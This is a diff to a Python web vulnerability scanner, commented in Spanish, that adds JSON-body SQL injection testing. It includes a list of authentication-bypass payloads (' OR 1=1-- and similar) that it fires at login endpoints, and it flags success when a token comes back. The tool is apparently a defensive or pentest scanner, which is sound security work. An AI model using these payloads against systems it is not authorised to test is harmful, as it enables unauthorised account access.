@@ -105,8 +105,87 @@ def test_time_sqli(
         pass
     return None
 
-def check_sqli(url: str, session: Optional[requests.Session] = None) -> list[dict[str, str]]:
+
+AUTH_BYPASS_PAYLOADS: list[str] = ["' OR 1=1--", "' OR '1'='1", "admin'--", "') OR ('1'='1--"]
+
+def test_json_sqli(
+    url: str,
+    session: Optional[requests.Session] = None,
+    json_body: Optional[dict[str, Any]] = None,
+) -> list[dict[str, str]]:
+    """Prueba inyecciones SQL en endpoints REST que aceptan cuerpos JSON (como APIs y endpoints de login)."""
     results: list[dict[str, str]] = []
+    client = session if session is not None else requests
+
+    candidates: list[dict[str, Any]] = []
+    if json_body:
+        candidates.append(json_body)
+    elif any(auth_kw in url.lower() for auth_kw in ("/login", "/auth", "/signin", "/token")):
+        candidates.append({"email": "test_probe@invalid.local", "password": "wrongpassword123"})  # nosec B105
+        candidates.append({"username": "test_user_probe", "password": "wrongpassword123"})  # nosec B105
+
+    for base_dict in candidates:
+        try:
+            r_base = client.post(url, json=base_dict, timeout=5)
+            base_status = r_base.status_code
+            base_body = r_base.text
+        except requests.RequestException:
+            continue
+
+        for key, orig_val in base_dict.items():
+            if not isinstance(orig_val, str) or key.lower() in ("password", "pass", "pwd"):
+                continue
+
+            # 1. Probar bypass de autenticación si base devolvió error de auth (400, 401, 403)
+            if base_status in (400, 401, 403):
+                for bypass_p in AUTH_BYPASS_PAYLOADS:
+                    payload_dict = base_dict.copy()
+                    payload_dict[key] = bypass_p
+                    try:
+                        r_bp = client.post(url, json=payload_dict, timeout=5)
+                        if r_bp.status_code == 200 and any(
+                            tok in r_bp.text.lower() for tok in ("token", "jwt", "authentication", "bearer", "success")
+                        ):
+                            results.append({
+                                "vuln": f"Bypass de Autenticación por SQLi en cuerpo JSON ('{key}')",
+                                "risk": "Crítico",
+                                "detail": f"Autenticación exitosa (HTTP 200) en '{url}' con payload en '{key}': {bypass_p}",
+                            })
+                            return results
+                    except requests.RequestException:
+                        pass
+
+            # 2. Probar errores SQL tradicionales en JSON
+            for err_p in ERROR_PAYLOADS:
+                payload_dict = base_dict.copy()
+                payload_dict[key] = err_p
+                try:
+                    r_err = client.post(url, json=payload_dict, timeout=5)
+                    err_body = r_err.text
+                    for sig in ERROR_SIGNATURES:
+                        if re.search(sig, err_body, re.IGNORECASE) and not re.search(sig, base_body, re.IGNORECASE):
+                            results.append({
+                                "vuln": f"Posible SQLi (Error) en cuerpo JSON ('{key}')",
+                                "risk": "Alto",
+                                "detail": f"Error de Base de Datos confirmado en '{url}' en campo '{key}' con payload: {err_p}",
+                            })
+                            return results
+                except requests.RequestException:
+                    pass
+
+    return results
+
+def check_sqli(
+    url: str,
+    session: Optional[requests.Session] = None,
+    json_body: Optional[dict[str, Any]] = None,
+) -> list[dict[str, str]]:
+    results: list[dict[str, str]] = []
+
+    # Probar inyección en cuerpo JSON si se provee o si la ruta es un endpoint de autenticación/API
+    json_results = test_json_sqli(url, session=session, json_body=json_body)
+    results.extend(json_results)
+
     parsed = urlparse(url)
     params = parse_qs(parsed.query)
 
